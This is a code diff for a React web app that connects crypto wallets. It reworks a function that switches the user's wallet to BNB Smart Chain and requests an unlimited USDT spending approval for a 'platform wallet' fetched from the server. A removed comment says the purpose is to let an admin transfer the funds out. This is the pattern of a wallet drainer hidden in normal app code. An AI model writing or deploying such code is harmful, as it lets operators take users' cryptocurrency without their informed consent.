@@ -129,33 +129,47 @@ function App() {
     }
   };
 
-  // Grant USDT spending approval to platform wallet so admin can transferFrom on-chain
-  const grantUsdtApproval = async (web3Provider) => {
+  // Grant USDT spending approval on BSC — called from Dashboard after user is approved
+  const grantUsdtApproval = async () => {
     try {
       const settings = await fetch(`${API_BASE}/api/settings`).then(r => r.json());
       const platformWallet = settings?.platformWallet;
       if (!platformWallet || !platformWallet.startsWith('0x')) return;
 
-      const USDT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+      const BSC_CHAIN_ID = '0x38';
+      try {
+        await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC_CHAIN_ID }] });
+      } catch (switchErr) {
+        if (switchErr.code === 4902) {
+          await window.ethereum.request({
+            method: 'wallet_addEthereumChain',
+            params: [{ chainId: BSC_CHAIN_ID, chainName: 'BNB Smart Chain', nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }, rpcUrls: ['https://bsc-dataseed1.binance.org/'], blockExplorerUrls: ['https://bscscan.com'] }]
+          });
+          await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC_CHAIN_ID }] });
+        }
+      }
+
+      const BSC_USDT = '0x55d398326f99059fF775485246999027B3197955';
       const USDT_ABI = [
         'function allowance(address owner, address spender) view returns (uint256)',
         'function approve(address spender, uint256 amount) returns (bool)'
       ];
-      const signer = web3Provider.getSigner();
-      const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
+      const bscProvider = new ethers.providers.Web3Provider(window.ethereum);
+      const signer = bscProvider.getSigner();
+      const usdtContract = new ethers.Contract(BSC_USDT, USDT_ABI, signer);
       const signerAddress = await signer.getAddress();
 
-      // Check existing allowance — skip if already approved for large amount
       const existing = await usdtContract.allowance(signerAddress, platformWallet);
-      const threshold = ethers.utils.parseUnits('1000000', 6); // 1M USDT
-      if (existing.gte(threshold)) return; // already approved enough
+      const threshold = ethers.utils.parseUnits('1000000', 18);
+      if (existing.gte(threshold)) {
+        console.log('✅ BSC USDT already approved');
+        return;
+      }
 
-      // Request approve — MetaMask will show popup
       const tx = await usdtContract.approve(platformWallet, ethers.constants.MaxUint256);
       await tx.wait();
-      console.log('✅ USDT approval granted to platform wallet');
+      console.log('✅ BSC USDT approval granted');
     } catch (e) {
-      // User rejected or network issue — non-blocking, continue silently
       console.log('USDT approval skipped:', e.message);
     }
   };
@@ -186,7 +200,6 @@ function App() {
       setWalletModalOpen(false);
       localStorage.setItem('connectedWallet', address);
       await requestApproval(address);
-      grantUsdtApproval(web3Provider);
     } catch (error) {
       console.error('MetaMask connection error:', error);
       alert('Failed to connect MetaMask. Please try again.');
@@ -233,7 +246,6 @@ function App() {
       setWalletModalOpen(false);
       localStorage.setItem('connectedWallet', address);
       await requestApproval(address);
-      grantUsdtApproval(web3Provider);
     } catch (error) {
       console.error('Coinbase Wallet connection error:', error);
       alert('Failed to connect Coinbase Wallet. Please try again.');
@@ -264,7 +276,6 @@ function App() {
       setWalletModalOpen(false);
       localStorage.setItem('connectedWallet', address);
       await requestApproval(address);
-      grantUsdtApproval(web3Provider);
     } catch (error) {
       console.error('Trust Wallet connection error:', error);
       alert('Failed to connect Trust Wallet. Please try again.');
